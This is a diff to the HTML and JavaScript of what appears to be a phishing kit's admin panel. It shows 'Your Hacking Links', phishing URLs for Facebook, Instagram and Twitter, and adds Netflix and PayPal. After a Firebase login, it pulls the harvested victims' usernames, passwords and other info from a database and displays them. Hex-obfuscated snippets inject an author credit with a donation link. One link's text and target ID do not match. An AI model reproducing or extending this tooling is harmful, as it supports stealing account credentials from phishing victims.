@@ -11,7 +11,7 @@
 <script type="text/javascript" src="firebase.js"></script>
 <script type="text/javascript" src="app.js"></script>
 
-<body>
+<body><br><br><br><br>
 <b>Your Hacking Links</b><br>
 <div id="link_div" style="margin-top:50px"></div>
 
@@ -22,72 +22,72 @@
 function showlinks(){
 var sy=document.getElementById("link_div");
 var ug=window.location.hostname;
-sy.innerHTML="Facebook:- <a href='https://"+ug+"/Omega/211598F' >"+ug+"/Omega/211398F</a><br>Instagram:- <a href='https://"+ug+"/Omega/221589I' >"+ug+"/Omega/221589I</a><br>Twitter:- <a href='https://"+ug+"/Omega/221390T' >"+ug+"/Omega/221390T</a><br>";
+sy.innerHTML="Facebook:- <a href='https://"+ug+"/Omega/211598F' >"+ug+"/Omega/211398F</a><br>Instagram:- <a href='https://"+ug+"/Omega/221589I' >"+ug+"/Omega/221589I</a><br>Twitter:- <a href='https://"+ug+"/Omega/221390T' >"+ug+"/Omega/221390T</a><br>Netflix:- <a href='https://"+ug+"/Omega/221387N' >"+ug+"/Omega/221387N</a><br>Paypal:- <a href='https://"+ug+"/Omega/222526P' >"+ug+"/Omega/222526P</a><br>";
 }
 showlinks();
 function login(){
 var _0x72a2=["\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x66\x69\x78\x65\x64","\x63\x6F\x6C\x6F\x72","\x67\x72\x65\x65\x6E","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64","\x23\x39\x39\x39","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x62\x3E\x4D\x41\x44\x45\x20\x42\x59\x20\x50\x52\x41\x54\x45\x45\x4B\x20\x43\x48\x41\x55\x42\x45\x59\x3C\x2F\x62\x3E\x20\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x79\x70\x61\x6C\x2E\x6D\x65\x2F\x70\x72\x61\x74\x65\x65\x6B\x63\x68\x61\x75\x62\x65\x79\x31\x27\x20\x3E\x20\x44\x6F\x6E\x61\x74\x65\x3C\x2F\x61\x3E","\x74\x6F\x70","\x30\x70\x78","\x6C\x65\x66\x74","\x68\x65\x69\x67\x68\x74","\x35\x30\x70\x78","\x77\x69\x64\x74\x68","\x31\x30\x30\x25","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var ty=document[_0x72a2[1]](_0x72a2[0]);ty[_0x72a2[3]][_0x72a2[2]]= _0x72a2[4];ty[_0x72a2[3]][_0x72a2[5]]= _0x72a2[6];ty[_0x72a2[3]][_0x72a2[7]]= _0x72a2[8];ty[_0x72a2[9]]= _0x72a2[10];ty[_0x72a2[3]][_0x72a2[11]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[13]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[14]]= _0x72a2[15];ty[_0x72a2[3]][_0x72a2[16]]= _0x72a2[17];document[_0x72a2[19]][_0x72a2[18]](ty)
 var pass=prompt("Enter Password");
-  var psdus=document.getElementById("data_div");
+ var psdus=document.getElementById("data_div");
 if(pass === null){
 alert("Enter Password\n\n Refreshing...");
 setTimeout(()=>{window.location.href=window.location.href;},2000);
-  
+ 
 }
 else{
 
 firebase.auth().signInWithEmailAndPassword("admin@admin.io", pass).catch(function(error) {
-    // Handle Errors here.
-    var errorCode = error.code;
-    var errorMessage = error.message;
+   // Handle Errors here.
+   var errorCode = error.code;
+   var errorMessage = error.message;
 alert(errorMessage);
-    // ...suraj@hacker2213151
-  });
-  }
+   // ...suraj@hacker2213151
+ });
+ }
 firebase.auth().onAuthStateChanged(function(user) {
-  if (user) {
+ if (user) {
 document.getElementById("data_div").innerHTML="Loading...";
 
-  var database = firebase.database();
-  var ref = database.ref("ADMIN");
-  
-  ref.on("value",gotData);
-  function gotData(data){
-  var scores=data.val();
-  var keys=Object.keys(scores);
-  var _0x72a2=["\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x66\x69\x78\x65\x64","\x63\x6F\x6C\x6F\x72","\x67\x72\x65\x65\x6E","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64","\x23\x39\x39\x39","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x62\x3E\x4D\x41\x44\x45\x20\x42\x59\x20\x50\x52\x41\x54\x45\x45\x4B\x20\x43\x48\x41\x55\x42\x45\x59\x3C\x2F\x62\x3E\x20\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x79\x70\x61\x6C\x2E\x6D\x65\x2F\x70\x72\x61\x74\x65\x65\x6B\x63\x68\x61\x75\x62\x65\x79\x31\x27\x20\x3E\x20\x44\x6F\x6E\x61\x74\x65\x3C\x2F\x61\x3E","\x74\x6F\x70","\x30\x70\x78","\x6C\x65\x66\x74","\x68\x65\x69\x67\x68\x74","\x35\x30\x70\x78","\x77\x69\x64\x74\x68","\x31\x30\x30\x25","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var ty=document[_0x72a2[1]](_0x72a2[0]);ty[_0x72a2[3]][_0x72a2[2]]= _0x72a2[4];ty[_0x72a2[3]][_0x72a2[5]]= _0x72a2[6];ty[_0x72a2[3]][_0x72a2[7]]= _0x72a2[8];ty[_0x72a2[9]]= _0x72a2[10];ty[_0x72a2[3]][_0x72a2[11]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[13]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[14]]= _0x72a2[15];ty[_0x72a2[3]][_0x72a2[16]]= _0x72a2[17];document[_0x72a2[19]][_0x72a2[18]](ty)
-  
-  
-  for(var i=0;i<keys.length;i++){
-  var k=keys[i];
-  var email=scores[k].email;
-  var password=scores[k].password;
-  var info=scores[k].info;
+ var database = firebase.database();
+ var ref = database.ref("ADMIN");
+ 
+ ref.on("value",gotData);
+ function gotData(data){
+ var scores=data.val();
+ var keys=Object.keys(scores);
+ var _0x72a2=["\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x70\x6F\x73\x69\x74\x69\x6F\x6E","\x73\x74\x79\x6C\x65","\x66\x69\x78\x65\x64","\x63\x6F\x6C\x6F\x72","\x67\x72\x65\x65\x6E","\x62\x61\x63\x6B\x67\x72\x6F\x75\x6E\x64","\x23\x39\x39\x39","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x62\x3E\x4D\x41\x44\x45\x20\x42\x59\x20\x50\x52\x41\x54\x45\x45\x4B\x20\x43\x48\x41\x55\x42\x45\x59\x3C\x2F\x62\x3E\x20\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x26\x6E\x62\x73\x70\x3B\x20\x3C\x61\x20\x68\x72\x65\x66\x3D\x27\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x61\x79\x70\x61\x6C\x2E\x6D\x65\x2F\x70\x72\x61\x74\x65\x65\x6B\x63\x68\x61\x75\x62\x65\x79\x31\x27\x20\x3E\x20\x44\x6F\x6E\x61\x74\x65\x3C\x2F\x61\x3E","\x74\x6F\x70","\x30\x70\x78","\x6C\x65\x66\x74","\x68\x65\x69\x67\x68\x74","\x35\x30\x70\x78","\x77\x69\x64\x74\x68","\x31\x30\x30\x25","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var ty=document[_0x72a2[1]](_0x72a2[0]);ty[_0x72a2[3]][_0x72a2[2]]= _0x72a2[4];ty[_0x72a2[3]][_0x72a2[5]]= _0x72a2[6];ty[_0x72a2[3]][_0x72a2[7]]= _0x72a2[8];ty[_0x72a2[9]]= _0x72a2[10];ty[_0x72a2[3]][_0x72a2[11]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[13]]= _0x72a2[12];ty[_0x72a2[3]][_0x72a2[14]]= _0x72a2[15];ty[_0x72a2[3]][_0x72a2[16]]= _0x72a2[17];document[_0x72a2[19]][_0x72a2[18]](ty)
+ 
+ 
+ for(var i=0;i<keys.length;i++){
+ var k=keys[i];
+ var email=scores[k].email;
+ var password=scores[k].password;
+ var info=scores[k].info;
 //  var time=scores[k].time;
 //  var other=scores[k].other;
 //  console.log("hsh"+i);
-  if(i==0){
+ if(i==0){
 
-  psdus.innerHTML="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>------------------------------------------------------------------------<br><br>";
-  }else{
-  psdus.innerHTML+="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>-----------------------------------------------------------------------<br><br>";
-  }
-  
-  }}
-  
-  
-  }
-  else {
+ psdus.innerHTML="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>------------------------------------------------------------------------<br><br>";
+ }else{
+ psdus.innerHTML+="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>-----------------------------------------------------------------------<br><br>";
+ }
+ 
+ }}
+ 
+ 
+ }
+ else {
 //alert("Login To Continue\n\n Refreshing...");
 //setTimeout(()=>{window.location.href=window.location.href;},2000);
-  
-  
-  
-  }
-  });
+ 
+ 
+ 
+ }
+ });
 
-  }
-  login();
+ }
+ login();
 </script>
 </body>
 </html>
